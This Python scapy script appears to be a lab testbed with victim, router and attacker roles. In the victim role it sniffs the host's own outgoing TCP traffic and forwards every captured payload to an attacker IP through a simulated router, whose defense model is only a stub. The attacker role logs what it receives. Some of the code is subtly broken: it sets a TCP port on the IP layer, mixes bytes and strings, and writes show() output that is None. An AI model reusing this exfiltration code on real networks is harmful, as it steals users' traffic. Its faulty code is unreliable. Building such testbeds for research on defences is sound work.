#!/usr/bin/python3
# Python file for the packet sniffer
# Incorporates scapy to capture packets in the network and 
# send them to the attacker

from scapy.all import *
from copy import deepcopy
import os
import my_ips

role = 'victim'

#Modular packet sniffing function
def packet_sniffer(my_filter, my_prn):
    print('Calling packet sniffer function.')
    pkt = sniff(filter=my_filter, iface='eth1', prn=my_prn)

#Send packets to a destination via the router VM. The router VM
#simulates a router on the network that is equipped with the
#defense model. The packet is sent to the router, which processes
#and reroutes the packet to its intended recipient.
def send_to_router(packet):
    true_src = packet[IP].src
    true_dst = packet[IP].dst
    true_dport = packet[TCP].dport
    true_load = packet[Raw].load

    load_append = ('|ORIG_DST=' + true_dst).encode("utf-8")

    new_packet = IP(dst=my_ips.router_ip)/TCP(dport=true_dport)/Raw(load=true_load + load_append)

    print('Sending packet to router')
    r1 = sr1(new_packet, timeout=5,iface='eth1')

#Victim functions
#---

#Sends packet to attacker (via the router VM)
def send_to_attacker(packet):
    try:
        data = packet[Raw].load
    except:
        data = ''.encode("utf-8")
    new_packet = IP(dst=my_ips.attacker_ip)/TCP(dport=80)/Raw(load=data)

    send_to_router(new_packet)
#---

#Router functions
#---

# Append the IP address info of the original sender (before being 
# forwarded by the router)
# Format is: |ORIG_SRC:xxx.xxx.xxx.xxx
def append_orig_source(data, orig_source):
    new_data = data + ('|ORIG_SRC=' + orig_source).encode("utf-8")

    return new_data

def reroute_packet(packet):
    try:
        data = packet[Raw].load
    except:
        data = ''.encode("utf-8")
    data = append_orig_source(data, packet[IP].src)

    forwarded_packet = IP()/TCP()/Raw(load=data)

    #Get destination address that was embedded in the payload
    dst_addr = get_packet_destination(data)
        
    # IP address is always the first in the list 
    
        
    # Source = hardcoded router's IP address 
    forwarded_packet[IP].src = get_if_addr('eth1')
    forwarded_packet[IP].dst = dst_addr
        
    forwarded_packet[TCP].sport = packet[TCP].sport
    forwarded_packet[IP].dport = packet[TCP].dport

    print('Forwarded packet')
    r1 = sr1(forwarded_packet, timeout=0,iface='eth1')

def defense_model(packet):
    return 0

#Parses payload to get the true desination address of the packet.
#Needed to implement a 'router' that has the defense model.
def get_packet_destination(data):
    # Look for this at the end of the payload
    test_field = "|ORIG_DST="
                                                         
    # end info = information after the main payload 
    end_info = data.partition(test_field)[2] 
    if(end_info == ''):
        return -1;
                                                         
    # Split the end substring by | delimiter 
    end_list = end_info.split('|')
    
    return end_list[0]

#---

#Attacker functions
#---

def log_packet(packet):
    f = open('log_file.txt', 'a')
    f.write(packet.show())
    f.write('\n')
    f.close()
    print(packet.show())

#---


if __name__=='__main__':
    local_ip = get_if_addr('eth1')
    if(role == 'victim'):
        packet_sniffer('src host ' + local_ip + ' and tcp', send_to_attacker)
    elif(role == 'router'):
        packet_sniffer('dst host ' + local_ip + ' and tcp', reroute_packet)
    elif(role == 'attacker'):
        packet_sniffer('src host ' + my_ips.router_ip + ' and tcp', log_packet)
    
